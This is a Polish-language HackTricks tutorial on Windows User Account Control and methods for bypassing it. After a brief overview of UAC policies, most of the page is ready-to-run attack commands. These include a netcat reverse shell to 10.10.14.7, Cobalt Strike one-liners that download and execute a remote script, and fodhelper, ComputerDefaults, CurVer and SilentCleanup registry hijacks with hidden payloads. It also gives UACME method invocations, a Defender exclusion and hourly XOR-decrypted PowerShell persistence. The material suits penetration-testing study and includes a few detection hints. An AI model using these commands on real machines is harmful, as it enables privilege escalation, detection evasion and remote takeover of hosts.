# UAC - Kontrola konta użytkownika

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja wyświetlająca **monit o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **potencjalnie mogą narazić system na niebezpieczeństwo**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta bez uprawnień administratora**, chyba że administrator jawnie zezwoli tym aplikacjom/zadaniom na dostęp do systemu na poziomie administratora. Jest to funkcja zwiększająca wygodę, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integralności:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest włączone, użytkownik będący administratorem otrzymuje 2 tokeny: token zwykłego użytkownika, który służy do wykonywania typowych działań przy średnim poziomie integralności, oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo opisuje działanie UAC, w tym proces logowania, sposób korzystania przez użytkownika oraz architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać zasad zabezpieczeń, aby konfigurować działanie UAC na potrzeby swojej organizacji lokalnie (za pomocą secpol.msc) albo konfigurować je i wdrażać za pomocą obiektów zasad grupy (GPO) w środowisku domeny Active Directory. Różne ustawienia omówiono szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 zasad grupy. Poniższa tabela zawiera dodatkowe informacje:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola konta użytkownika: tryb zatwierdzania przez administratora dla wbudowanego konta Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [Kontrola konta użytkownika: zachowanie monitu o podwyższenie uprawnień dla administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
| [Kontrola konta użytkownika: zachowanie monitu o podwyższenie uprawnień dla zwykłych użytkowników](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o podanie poświadczeń na bezpiecznym pulpicie)         |
| [Kontrola konta użytkownika: wykrywanie instalacji aplikacji i monit o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [Kontrola konta użytkownika: podwyższanie uprawnień tylko dla podpisanych i zweryfikowanych plików wykonywalnych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [Kontrola konta użytkownika: podwyższanie uprawnień dla aplikacji UIAccess zainstalowanych tylko w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [Kontrola konta użytkownika: uruchamianie wszystkich administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [Kontrola konta użytkownika: zezwalanie aplikacjom UIAccess na wyświetlanie monitów o podwyższenie uprawnień bez używania bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [Kontrola konta użytkownika: przełączanie na bezpieczny pulpit podczas wyświetlania monitu o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [Kontrola konta użytkownika: wirtualizacja nieudanych zapisów plików i rejestru do lokalizacji użytkownika](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Zasady instalowania oprogramowania w systemie Windows

**Lokalne zasady zabezpieczeń** (w większości systemów dostępne przez „secpol.msc”) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom bez uprawnień administratora instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik bez uprawnień administratora może pobrać instalator oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Klucze rejestru wymuszające monit UAC o podwyższenie uprawnień

Jako zwykły użytkownik bez uprawnień administratora możesz sprawić, że konto „zwykłego” użytkownika będzie **proszone przez UAC o podanie poświadczeń**, gdy podejmie próbę wykonania określonych działań. Wymaga to zmiany niektórych **kluczy rejestru**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** lub atakujący jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, te zmiany wymuszają **ponowne podanie poświadczeń konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne tylko wtedy, gdy masz już token z podwyższonymi uprawnieniami, UAC bypass albo błędną konfigurację pozwalającą na zmianę tych kluczy; w przeciwnym razie zapis w rejestrze zostanie zablokowany.**

Należy zmienić następujące klucze i wpisy rejestru (wartości domyślne podano w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie za pomocą narzędzia Lokalne zasady zabezpieczeń. Po wprowadzeniu zmian operacje administracyjne będą powodować monit o ponowne podanie poświadczeń.

### Uwaga

**Kontrola konta użytkownika nie jest granicą bezpieczeństwa.** Dlatego zwykli użytkownicy nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez wykorzystania exploita do eskalacji uprawnień lokalnych.

### Poproś użytkownika o „pełny dostęp do komputera”

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Uprawnienia UAC

- Internet Explorer Protected Mode używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to przez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać uzyskiwaniu przez ataki zdalnego wykonania kodu dostępu do poufnych danych w systemie.
- Gdy użytkownik loguje się do systemu Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę poświadczeń użytkownika, czyli danych używanych do uwierzytelniania go na komputerze i uzyskiwania dostępu do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować automatyczne logowanie określonego użytkownika do systemu Windows podczas uruchamiania, ustaw **klucz rejestru `AutoAdminLogon`**. Jest to przydatne w środowiskach kiosków lub do celów testowych. Używaj tej funkcji tylko w zabezpieczonych systemach, ponieważ powoduje ona ujawnienie hasła w rejestrze.

Ustaw następujące klucze za pomocą Edytora rejestru lub polecenia `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do komputera ofiary, UAC bypass jest prosty — wystarczy kliknąć „Tak”, gdy pojawi się monit UAC.

UAC bypass jest potrzebny w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twoje konto należy do grupy administratorów**.

Warto wspomnieć, że **znacznie trudniej jest przeprowadzić UAC bypass, gdy poziom zabezpieczeń jest najwyższy (Always), niż gdy ustawiony jest którykolwiek z pozostałych poziomów (Default).**

### Szybka ocena sytuacji z powłoki o średnim poziomie integralności

Zanim spróbujesz przeprowadzić bypass, upewnij się, że znajdujesz się w odpowiedniej sytuacji, i sprawdź kompilację systemu pod kątem znanych, działających metod:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: każdy token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla bypassów auto-elevate / opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale i tak przetestuj konkretną kompilację, zamiast zakładać, że próba się nie powiedzie: UACME nadal śledzi niektóre metody zgodne z `AlwaysNotify` na współczesnych kompilacjach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` ma wartość **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass przez duplikację tokenu

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + wielokrotnego użytku obiekt debugowania

Interfejs local RPC AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` może utworzyć proces z włączonym debugowaniem. Procesy utworzone w trybie debugowania na tym samym wątku współdzielą jego obiekt debugowania; zdarzenie debugowania utworzenia procesu zawiera uchwyt do procesu z pełnym dostępem, nawet jeśli sam wynik RPC przyznaje tylko ograniczony dostęp. Dzięki temu ponowne użycie obiektu debugowania staje się prymitywem UAC dla użytkownika o średnim poziomie integralności, należącego do grupy Administrators.<sup>[[11]](#references)[[12]](#references)</sup>

Praktyczny łańcuch wygląda następująco:<sup>[[11]](#references)[[12]](#references)</sup>

1. Wywołaj metodę local RPC (bezpośrednio lub przez `NdrAsyncClientCall`), aby utworzyć niewyewoluowany proces ofiarny z włączonym debugowaniem.
2. Odpytaj `ProcessDebugObjectHandle` za pomocą `NtQueryInformationProcess`, odłącz obiekt przez `NtRemoveProcessDebug`, zachowaj go i zakończ proces ofiarny.
3. Użyj tego samego interfejsu RPC, aby utworzyć zaufany, automatycznie podwyższający uprawnienia proces, a następnie powiąż zapisany obiekt z wywołującym wątkiem przez `DbgUiSetThreadDebugObject`.
4. Wywołaj `WaitForDebugEvent` i pobierz uchwyt procesu ze zdarzenia `CREATE_PROCESS_DEBUG_EVENT`; przed wznowieniem procesu zduplikuj go za pomocą `NtDuplicateObject`.
5. Przekaż zduplikowany uchwyt do `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i uruchom payload ze strukturą rozszerzonych informacji startowych. W ten sposób ponownie wykorzystujesz kontekst podwyższonych uprawnień procesu i nadajesz procesowi potomnemu wiarygodnie wyglądającą relację z procesem nadrzędnym.

Szukaj krótkiej sekwencji zdarzeń, a nie tylko automatycznie podwyższającego uprawnienia pliku binarnego: tworzenia procesu przez local AppInfo RPC, zapytań `ProcessDebugObjectHandle`, odłączania i ponownego dołączania debuggera, natychmiastowego zdarzenia debugowania utworzenia procesu, duplikowania uchwytu oraz procesu potomnego, którego zarejestrowany proces nadrzędny nie jest tym, który wywołał API tworzące proces.<sup>[[12]](#references)</sup>

### **Bardzo** podstawowy „bypass” UAC (pełny dostęp do systemu plików)

Jeśli masz shell użytkownika należącego do grupy Administrators, możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk i uzyskasz **dostęp do całego systemu plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Obejście UAC za pomocą Cobalt Strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy poziom zabezpieczeń UAC nie jest ustawiony na maksimum.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** i **Metasploit** mają również kilka modułów do **omijania** **UAC**.

### Podwyższone uprawnieniami interfejsy COM (`ICMLuaUtil` / `CMSTPLUA`)

Automatycznie podwyższane uprawnieniami obiekty COM pozostają praktycznym wektorem UAC w nowoczesnych kompilacjach systemu. UACME nadal śledzi `ICMLuaUtil` jako działający w obecnych gałęziach Windows, a narzędzia ofensywne wciąż dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonanie 64-bitowe, a czasem podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowy shell zawiedzie, ponów próbę z implementacji BOF / UACME zamiast korzystać z naiwnej otoczki `CreateProcess`.
- Pamiętaj, że proces potomny zostanie uruchomiony w **oddzielnym procesie z podwyższonymi uprawnieniami**; wiele BOF-ów nie podwyższa uprawnień bieżącego beacona w miejscu.

### KRBUACBypass

Dokumentacja i narzędzie dostępne pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploity omijania UAC

[**UACME**](https://github.com/hfiref0x/UACME) to zbiór technik omijania UAC. Skompiluj go za pomocą Visual Studio lub MSBuild; kompilacja tworzy kilka plików wykonywalnych (na przykład `Source\Akagi\output\x64\Debug\Akagi.exe`), więc wybierz metodę odpowiednią dla kompilacji systemu docelowego.<sup>[[3]](#references)</sup>\
Uważaj: niektóre metody omijania uruchamiają widoczne programy lub monity, które mogą zaalarmować użytkownika.<sup>[[3]](#references)</sup>

UACME podaje **wersję kompilacji, od której dana technika zaczęła działać**.<sup>[[3]](#references)</sup> Możesz wyszukać technikę działającą na Twoich wersjach:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Korzystając z [tej](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, możesz ustalić wydanie Windows `1607` na podstawie numerów kompilacji.

Praktyczny workflow polega na tym, by najpierw **ocenić kompilację hosta**, a dopiero potem uruchomić pasującą metodę:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co ułatwia szybkie odrzucenie nieaktualnych PoC.<sup>[[4]](#references)</sup>
- `UACME` nadal jest najlepszym publicznym katalogiem do dopasowania bypassu do konkretnego builda. Wersja 3.7.1 dodała metody 83–85, a poprzednie wydanie ponownie przetestowało istniejące metody w **Windows 11 25H2**; ponownie sprawdź tabelę metod i informacje o wydaniach, zamiast zakładać, że stary PoC nadal działa bez zmian.<sup>[[3]](#references)[[9]](#references)</sup>

### Łańcuchy WNF/UIAccess obsługujące Always Notify (UACME 3.7.1)

`Always Notify` nie eliminuje wszystkich bypassów UAC. UACME 3.7.1 implementuje trzy nowe metody x64, które łączą kontrolowany przez użytkownika stan środowiska/protokołu z zachowaniem podwyższonych uprawnień zaplanowanego zadania lub UIAccess, i oznacza je wszystkie jako `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** przekieruj `SystemRoot`, aby zadanie wyzwalane przez WNF `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` spowodowało, że podwyższony proces `taskhostw.exe` załaduje bocznie `unifiedconsent.dll`. UACME śledzi tę metodę od Windows 10 build 19041.
- **84 — TabTip:** użyj tego samego prymitywu zmiennej środowiskowej wobec UIAccess `TabTip.exe`, który ładuje `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` lub `rsaenh.dll` — zależnie od builda — a następnie wykonaj pivot z uzyskanego kontekstu UIAccess o wysokiej integralności. UACME śledzi tę metodę od Windows 8.1 / Server 2016.
- **85 — Narrator:** przejmij protokół `feedback-hub` dla danego użytkownika, steruj Narratorem za pomocą `Alt+CapsLock+F`, a następnie uruchom zapisywalną kopię `osk.exe`, która załaduje bocznie `OskSupport.dll`. Wymaga to interaktywnego pulpitu; metoda jest śledzona od Windows 10 1809 / Server 2019.

Po zbudowaniu jednostek payloadu i Akagi zgodnie z dokumentacją UACME wywołaj pasujący numer metody (opcjonalne polecenie domyślnie ma wartość `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Metody 84 i 85 zależą od UIAccess/interakcji z pulpitem, więc nie należy oczekiwać, że będą działać bez zmian w Session 0 lub nieinteraktywnej powłoce usługi. Wszystkie trzy metody modyfikują stan środowiska/protokołu i umieszczają pliki DLL; po testach sprawdź implementację i usuń te artefakty.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany plik binarny `fodhelper.exe` jest automatycznie podnoszony do wyższych uprawnień w nowoczesnym systemie Windows. Po uruchomieniu odczytuje poniższą ścieżkę rejestru bieżącego użytkownika, nie sprawdzając czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o poziomie High Integrity bez monitu UAC.

Ścieżka rejestru odczytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Kroki PowerShell (ustaw payload, a następnie uruchom)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Uwagi:
- Działa, gdy bieżący użytkownik należy do grupy Administrators, a poziom UAC jest domyślny/łagodny (nie „Always Notify” z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Aby zachować dyskrecję, unikaj interfejsów użytkownika wyświetlających monity.

#### Wyzwalanie `ComputerDefaults.exe` dla tego samego handlera `ms-settings`

`ComputerDefaults.exe` rozwiązuje to samo skojarzenie `ms-settings\Shell\Open\command` dla bieżącego użytkownika co `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Po ustawieniu domyślnego polecenia i pustej wartości `DelegateExecute` powyżej użyj `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` jako alternatywnego wyzwalacza; nie powtarzaj konfiguracji rejestru.<sup>[[13]](#references)[[14]](#references)</sup> Wymagania dotyczące administratora o średnim poziomie integralności i zasad UAC opisane w uwagach dotyczących `fodhelper.exe` powyżej nadal obowiązują.<sup>[[2]](#references)[[3]](#references)</sup> UACME wymienia ten wyzwalacz począwszy od Windows 10 RS4 (build 17134), więc zweryfikuj go na docelowym buildzie.<sup>[[3]](#references)</sup>

#### Wariant hijack CurVer/rozszerzenia (tylko HKCU)

Nowsze próbki nadużywające `fodhelper.exe` pomijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Automatycznie podnoszony plik binarny nadal rozwiązuje handler w `HKCU`, więc do umieszczenia kluczy nie jest potrzebny token administratora:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie stosuje dodatkowe techniki unikania wykrycia (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza mechanizm persistence, aby uruchamiać się z wysokim poziomem integralności. Typowe zadanie persistence zapisuje na dysku **skrypt PowerShell zaszyfrowany XOR-em** i co godzinę dekoduje go oraz wykonuje w pamięci:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Ta odmiana nadal usuwa dropper i pozostawia tylko staged payloads, przez co wykrywanie wymaga monitorowania **hijacku `CurVer`**, manipulacji `ConsentPromptBehaviorAdmin`, tworzenia wykluczeń Defendera lub zadań harmonogramu, które deszyfrują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### Obejście UAC przez zadanie `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać wysoki poziom integralności bez okna dialogowego zgody.<sup>[[8]](#references)</sup> Tę metodę nadal warto testować na najnowszych kompilacjach, ponieważ UACME wciąż obsługuje tę technikę, a śledzenie najnowszych zgłoszeń wskazuje, że w Windows 11 24H2 mogą wystarczyć niewielkie zmiany w cudzysłowach.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Jeśli zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po testach zawsze usuń `HKCU\Environment\windir`.

#### Więcej UAC bypass

Wiele klasycznych metod UAC bypass, które wykorzystują przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem, wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarczą.

Często można to rozwiązać za pomocą sesji **meterpreter**. Przenieś się do **process**, którego wartość **Session** wynosi **1**:

![Ustaw ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu — Więcej UAC bypass: Można to zrobić za pomocą sesji meterpreter. Przenieś się do procesu, którego wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI, możesz po prostu zaakceptować monit UAC**, gdy się pojawi; nie potrzebujesz wtedy technicznego obejścia. Dlatego uzyskanie sesji GUI często wystarcza, by ominąć praktyczne utrudnienia wprowadzane przez UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), mogą być w niej uruchomione **narzędzia z uprawnieniami administratora**, za pomocą których można na przykład bezpośrednio **uruchomić** **cmd** **jako administrator**, bez ponownego wyświetlania monitu UAC, jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli hałas jest akceptowalny, narzędzie takie jak [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) może wielokrotnie żądać podniesienia uprawnień, aż użytkownik zaakceptuje monit.

### Własne obejście — podstawowa metodyka UAC bypass

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele metod UAC bypass wykorzystuje DLL hijacking** (często polegający na tym, że podwyższony proces ładuje kontrolowaną przez atakującego bibliotekę DLL z zapisywalnej ścieżki). [Przeczytaj, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź plik binarny, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą wskazywać na podatność **DLL Hijacking**.
3. Prawdopodobnie trzeba będzie **zapisać** bibliotekę DLL w jednej z **chronionych ścieżek** (na przykład C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść, używając:
   1. **wusa.exe**: Windows 7,8 i 8.1. Umożliwia wyodrębnienie zawartości pliku CAB do chronionych ścieżek (ponieważ to narzędzie działa na wysokim poziomie integralności).
   2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, który skopiuje bibliotekę DLL do chronionej ścieżki, a następnie uruchomi podatny plik binarny wykonujący autoelevate.

### Inna technika UAC bypass

